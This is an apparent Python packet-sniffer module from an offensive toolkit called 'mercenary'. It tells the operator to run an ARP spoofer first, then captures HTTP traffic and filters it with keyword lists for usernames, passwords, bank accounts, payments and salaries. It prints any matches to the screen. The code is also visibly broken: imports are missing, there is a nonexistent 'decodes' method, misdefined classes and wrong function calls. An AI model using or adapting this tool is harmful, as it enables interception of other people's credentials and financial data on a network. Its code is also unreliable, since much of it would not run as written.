import sys
from scapy.all import *
from colorama import Fore
from colorama import Style
import psutil
from prettytable import PrettyTable
from kivy.app import App
import kivy
from kivy.uix.boxlayout import BoxLayout
import socket

class PacketSniffer(BoxLayout):

    # Function to handle each packet
    def handle_packet(packet, log):
        # Check if the packet contains TCP layer
        if packet.haslayer(TCP):
            # Extract source and destination IP addresses
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            # Extract source and destination ports
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            # Write packet information to log file
            log.write(f"TCP Connection: {src_ip}:{src_port} -> {dst_ip}:{dst_port}\n")

#get_current_mac:
def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig",interface])
        return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output)).group(0)
    except:
        pass
# Main function to start packet sniffing
def main(interface, verbose=False):
    # should look familiar from previous example
    if os.name == 'nt':
        socket_protocol = socket.IPPROTO_IP
    else:
        socket_protocol = socket.IPPROTO_ICMP
        sniffer = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket_protocol)
    # Create log file name based on interface
    logfile_name = f"sniffer_{interface}_log.txt"
    # Open log file for writing
    with open(logfile_name, 'w') as logfile:
        try:
            #if its linux,turn on promiscous mode
            if os.name == 'nt':
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            # Start packet sniffing on specified interface with verbose output
            if verbose:
                sniff(iface=interface, prn=lambda pkt: handle_packet(pkt, logfile), store=0, verbose=verbose)
            else:
                sniff(iface=interface, prn=lambda pkt: handle_packet(pkt, logfile), store=0)
        except KeyboardInterrupt:
            sys.exit(0)

def ip_table():
    #get all the interface details in with psutil in a variable
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface','Mac Address',f'IP Address{Style.RESET_ALL}'])
    for k, v  in addrs.items():
        mac = get_current_mac(k)

def process_sniffed_packets(packet):
    #function to mornitor packets,check if packet has a layer httprequest
    if packet.haslayer(http.HTTPRequest):
        #if the packet has the http request then we check that it contain the RAW field of the packet
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        acc = get_account_info(packet)
        #if get_login_info found some then spit those out
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Send >>>> ", test ,f"{Style.RESET_ALL}")
        #if any get_account found, spit it out
        if acc:
            print(f"{Fore.GREEN}[+] Account is Send >>>> ", acc ,f"{Style.RESET_ALL}")
        #To Print the raw Packet
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)

def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
            #if it contain the raw fild then print that field post request 
            load = packet[scapy.all.Raw].load
            load_decode = load.decode()
            keywords = ["username","user","email","pass","login","password","UserName","Password"]
            for i in keywords:
                if i in load_decode:
                    return load_decode

def get_account_info(packet):
    if packet.haslayer(scapy.all.Raw):
            #if it contain the raw fild then print that field post request 
            load = packet[scapy.all.Raw].load
            load_decodes = load.decodes()
            wanted = ["Bank Accounts","bank account","accounts","payment","salaries"]
            for i in wanted:
                if i in load_decodes:
                    return load_decodes

def url_extractor(packet):
    #get the http layer of the packet
    http_layer= packet.getlayer('HTTPRequest').fields
    #get the ip layer of the packet 
    ip_layer = packet.getlayer('IP').fields
    #Print them in a readable form 
    print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
    return

def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}".format(k,label))  
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")  
    print("---------------------------------------------------------")
    # TO NOT PRINT A SOLE RAW PACKET COMMENT THE BELOW LINE
    print(httplayer)

def PktSnfApp(App):
    def build(self):
        return PacketSniffer()

# Check if the script is being run directly
if __name__ == "__main__":
    print(f"{Fore.BLUE}Welcome To mercenary Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to to print the raw Packet : Y?N : ")
        ip_table()
        interface = input("[*] Please enter the interface name: ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        #Be nice,Carefull not to overload/crash the server
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)